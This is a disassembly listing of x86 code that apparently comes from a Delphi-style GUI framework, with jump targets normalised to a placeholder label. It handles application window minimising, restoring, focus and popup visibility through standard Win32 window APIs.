cmp edx [ ebx + 0x60 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x60 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x74 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x74 ] esi
mov eax [ ecx ]
call sub_49d594
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_49ee88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or edi 0xffffffff
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x170 ]
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x4
push ebx
call GetWindow
cmp esi eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_479ce0
mov esi eax
jmp r-xdata
push 0xffffffec
push ebx
call GetWindowLongW
test al 0x8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor edi edi
mov eax [ rw-data ]
cmp [ eax + 0x44 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_4303e0
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
test [ esi + 0x1c ] 0x8
jne r-xdata
mov eax esi
call sub_479ce0
cmp ebx eax
je r-xdata
sub_49ef3c
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x170 ]
test eax eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_49ee88
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongW
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4305a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_49f04c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0xcc ]
call sub_40875c
mov edx eax
test edx edx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc edx
xor eax eax
inc eax
dec edx
jne r-xdata
mov edx [ ebx + 0xcc ]
xor ecx ecx
mov [ edx + esi * 4 + 0x4 ] ecx
mov eax [ ebx + 0xcc ]
mov [ eax + esi * 4 ] 0xffffffff
jmp r-xdata
lea esi [ eax + eax * 2 ]
mov ecx [ ebx + 0xcc ]
cmp edi [ ecx + esi * 4 + 0x4 ]
jne r-xdata
sub_49f09c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x170 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4305a0
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_49f108
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
or edi 0xffffffff
push 0x4
push esi
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
je r-xdata
test ebx ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_430608
test eax eax
jge r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
call GetWindowThreadProcessId
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp esi [ eax + 0x170 ]
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x98 ]
mov edx ebx
call sub_4303e0
call GetCurrentProcessId
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x170 ]
jne r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xd8 ]
call sub_408754
inc eax
push eax
mov eax [ rw-data ]
add eax 0xd8
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
mov eax [ rw-data ]
mov eax [ eax + 0xd8 ]
call sub_408754
mov edx [ rw-data ]
mov edx [ edx + 0xd8 ]
mov [ edx + eax * 4 - 0x4 ] esi
sub_49f1fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
cmp [ esi + 0x9c ] 0x0
jle r-xdata
cmp [ esi + 0x9c ] 0x0
jne r-xdata
dec [ esi + 0x9c ]
cmp [ esi + 0x9c ] 0x0
jne r-xdata
inc [ esi + 0x9c ]
jmp r-xdata
mov eax esi
call sub_4a20ec
push eax
push sub_49f108
call EnumWindows
cmp [ esi + 0x44 ] 0x0
je r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ esi + 0x98 ]
mov edi [ eax + 0x8 ]
dec edi
cmp edi 0x0
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_4305a0
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0xd8 ]
call sub_40875c
mov edi eax
cmp edi 0x0
jl r-xdata
mov eax [ esi + 0x98 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x0
lea eax [ esi + 0xd8 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40891c
add esp 0x4
cmp bl 0x1
cmc
sbb eax eax
push eax
mov edx edi
mov eax [ esi + 0x98 ]
call sub_4305a0
push eax
call ShowOwnedPopups
dec edi
cmp edi 0xffffffff
jne r-xdata
mov eax [ esi + 0xd8 ]
call sub_40875c
mov edi eax
cmp edi 0x0
jl r-xdata
push 0x0
mov eax [ esi + 0xd8 ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
push 0x5
mov eax [ esi + 0xd8 ]
mov eax [ eax + edi * 4 ]
push eax
call ShowWindow
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_49f3cc
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ edi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ edi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_417da0
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_49dbe8
mov eax [ rw-data ]
call sub_49e3a4
cmp [ edi + 0xd3 ] 0x0
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax [ edi + 0x170 ]
call sub_4940a8
mov cl 0x1
xor edx edx
mov eax [ edi + 0x170 ]
call sub_4940a8
sub_49f44c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_49f4bb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x16a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_49f4c2
lea eax [ ebp - 0x8 ]
call j_sub_4068a0
retn
mov eax [ esi + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x8 ]
call sub_407254
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
sub_49f4c8
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call DefWindowProcW
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_49f508
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_49fcf8
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_49f558
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_49fcda
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49f3cc
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb031
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
movzx edx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_4a0cb0
jmp r-xdata
cmp eax 0x11
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx esi
call sub_4305a0
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
add eax 0xffff4fc1
sub eax 0x2
jb r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1c
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a212c
and eax 0x7f
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
sub eax 0xb01a
je r-xdata
mov ebx eax
mov eax ebx
call sub_479ce0
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x1d
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov dx 0xb056
mov eax [ ebp - 0x4 ]
call sub_4a13f4
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_494028
test eax eax
jne r-xdata
sub eax 0x5
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call GetLastActivePopup
mov edx [ ebp - 0x4 ]
mov [ edx + 0xd4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x13a ] 0x0
je r-xdata
sub eax 0x15
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x142 ] 0x0
je r-xdata
sub eax 0x112
je r-xdata
mov eax [ rw-data ]
call sub_49e3a4
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
sub eax 0x1a
je r-xdata
push ebp
call sub_49f4c8
pop ecx
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x28 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x24 ] 0x1
sbb eax eax
inc eax
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa5 ] al
test al al
je r-xdata
sub eax 0x14
je r-xdata
push ebp
call sub_49f4c8
pop ecx
jmp [ eax * 4 + jump_table_49f5fc ]
call GetFocus
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x170 ]
jne r-xdata
dec eax
je r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4a02f8
test al al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov ebx [ eax + 0x44 ]
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
sub eax 0xf020
je r-xdata
add eax 0xffffffe0
sub eax 0x7
jb r-xdata
mov eax [ ebp - 0x4 ]
call sub_49fcf8
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_49f03c
push 0x0
push 0x0
push 0xb001
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x27
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
sub eax 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_494028
test eax eax
je r-xdata
push 0x0
push 0x0
push 0xb01a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x38 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebp - 0x34 ] 0x0
je r-xdata
xor eax eax
call sub_43b054
jmp r-xdata
xor eax eax
call sub_494358
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
mov [ rw-data ] 0x0
call GetFocus
mov esi eax
mov eax ebx
call sub_479ce0
push eax
call SetFocus
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_472314
push esi
call SetFocus
mov [ rw-data ] 0x1
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xd4 ] edx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xd3 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49fd14
jmp r-xdata
sub eax 0x100
je r-xdata
mov esi [ ebp - 0x8 ]
mov esi [ esi + 0x8 ]
push esi
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
add ebx 0xbc00
push ebx
mov eax [ ebp - 0x8 ]
push esi
call __imp_SendMessageW
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
sub eax 0x1e1
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_49f09c
push 0x0
push 0x0
push 0xb000
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
push eax
call PostMessageW
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esi eax
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
sub eax 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x1
jmp r-xdata
call sub_49b6b8
jmp r-xdata
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
push ebp
call sub_49f508
pop ecx
jmp r-xdata
push ebp
call sub_49f4c8
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xb4 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push eax
call SetFocus
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4a05f4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov eax [ ebp - 0x4 ]
call sub_4a0594
jmp r-xdata
mov eax ebx
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_49fe18
jmp r-xdata
jmp r-xdata
call sub_485c78
call sub_485de0
mov [ ebp - 0x18 ] 0xb051
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_49d570
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x34 ] 0x0
mov eax [ rw-data ]
call sub_4a08fc
cmp [ ebp - 0x44 ] 0x0
je r-xdata
cmp [ eax + 0x29a ] 0x1
jne r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_47f9f4
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_49f44c
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_49f044
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_49f09c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_479ce0
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0xd4 ]
je r-xdata
push ebp
call sub_49f4c8
pop ecx
jmp r-xdata
inc ebx
xor esi esi
call sub_4066c8
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov dx 0x16
mov eax [ ebp - 0x4 ]
call sub_4a13f4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4941f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb4 ] eax
call sub_4942bc
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xb4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xd4 ]
push eax
call SetFocus
mov edx esi
mov eax [ rw-data ]
call sub_49d55c
lea edx [ ebp - 0x18 ]
call sub_4758a4
inc esi
dec ebx
jne r-xdata
jmp r-xdata
sub_49fd14
push ebx
mov ebx eax
mov eax [ ebx + 0x170 ]
call sub_494028
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_49f03c
cmp [ ebx + 0xd3 ] 0x0
jne r-xdata
mov [ ebx + 0x34 ] 0x1
xor edx edx
mov eax ebx
call sub_49f1fc
cmp [ ebx + 0xd3 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov edx 0x6
mov eax [ ebx + 0x170 ]
call sub_49e650
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
mov [ ebx + 0xdc ] 0x1
jmp r-xdata
mov dl 0x1
call sub_4986e4
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
mov eax [ ebx + 0x44 ]
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
cmp [ ebx + 0x14a ] 0x0
je r-xdata
push 0x40
push 0x0
mov eax [ ebx + 0x44 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebx + 0x44 ]
call sub_496884
push eax
mov eax [ ebx + 0x44 ]
call sub_496864
push eax
mov eax [ ebx + 0x44 ]
call sub_479ce0
push eax
mov eax [ ebx + 0x170 ]
push eax
call SetWindowPos
push 0x0
push 0xf020
push 0x112
mov eax [ ebx + 0x170 ]
push eax
call DefWindowProcW
jmp r-xdata
sub_49fe18
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x170 ]
call sub_494028
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x34 ] 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetActiveWindow
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0xd3 ] 0x0
je r-xdata
mov eax ebx
call sub_49f09c
mov dl 0x1
mov eax ebx
call sub_49f1fc
mov eax [ rw-data ]
mov esi [ eax + 0x60 ]
test esi esi
je r-xdata
cmp [ eax + 0x29a ] 0x1
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
jne r-xdata
push 0x9
mov eax esi
call sub_479ce0
push eax
call ShowWindow
jmp r-xdata
cmp [ ebx + 0x152 ] 0x0
je r-xdata
mov eax esi
call sub_479ce0
push eax
call SetFocus
cmp [ eax + 0x59 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_479ce0
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax [ ebx + 0x44 ]
cmp [ eax + 0x59 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
xor edx edx
call sub_4986e4
mov eax [ ebx + 0x44 ]
call sub_49bba8
mov edx 0x9
mov eax [ ebx + 0x170 ]
call sub_49e650
push 0x0
push 0xf120
push 0x112
mov eax [ ebx + 0x170 ]
push eax
call DefWindowProcW
jmp r-xdata
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
push 0x40
push 0x0
push 0x0
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
push eax
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetWindowPos
adc eax 0x0
sub_49ff58
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xd3 ] 0x0
je r-xdata
mov eax [ ebx + 0x170 ]
cmp [ ebx + 0x44 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push eax
call GetLastActivePopup
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x44 ]
call sub_479ce0
jmp r-xdata
cmp esi [ ebx + 0x170 ]
je r-xdata
test eax eax
je r-xdata
push esi
call IsWindowVisible
test eax eax
je r-xdata
push esi
call IsWindowEnabled
test eax eax
je r-xdata
push esi
call SetForegroundWindow
sub_49ffb0
push ebx
push esi
add esp 0xfffffdfc
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4070a8
cmp [ ebx + 0xd3 ] 0x0
jne r-xdata
push 0x100
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x170 ]
push eax
call GetWindowTextW
mov ecx eax
mov edx esp
mov eax esi
call sub_4071e4
mov eax [ esi ]
mov [ esp + 0x200 ] eax
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
test eax eax
jne r-xdata
sub eax 0x4
mov eax [ eax ]
add esp 0x204
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8c ]
call sub_4070a8
jmp r-xdata
sub_4a0040
push ebx
push esi
cmp dl [ eax + 0x35 ]
je r-xdata
pop esi
pop ebx
retn
mov [ eax + 0x35 ] dl
mov eax [ rw-data ]
call sub_49d570
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_49d55c
xor ecx ecx
mov edx 0xb03d
call sub_472314
inc esi
dec ebx
jne r-xdata
sub_4a0090
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8c ]
mov edx esi
call sub_407768
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xac ] 0x0
je r-xdata
lea eax [ ebx + 0x8c ]
mov edx esi
call sub_4070a8
cmp [ ebx + 0xd3 ] 0x0
je r-xdata
mov eax esi
call sub_407134
push eax
mov eax [ ebx + 0x170 ]
push eax
call SetWindowTextW
push 0x0
mov eax [ ebx + 0x170 ]
push eax
call SetWindowTextW
jmp r-xdata
sub_4a00ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xac ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x170 ]
je r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] esi
test esi esi
je r-xdata
push ebx
push sub_49f3cc
mov eax ebx
call sub_4a05f4
push ebx
push sub_49f3cc
mov eax ebx
call sub_4a0594
sub_4a0134
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ ebx + 0xb8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
call IsWindowUnicode
test eax eax
je r-xdata
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageA
cmp eax 0x1
sbb eax eax
inc eax
push esi
mov eax [ ebx + 0xb8 ]
push eax
call IsDialogMessageW
cmp eax 0x1
sbb eax eax
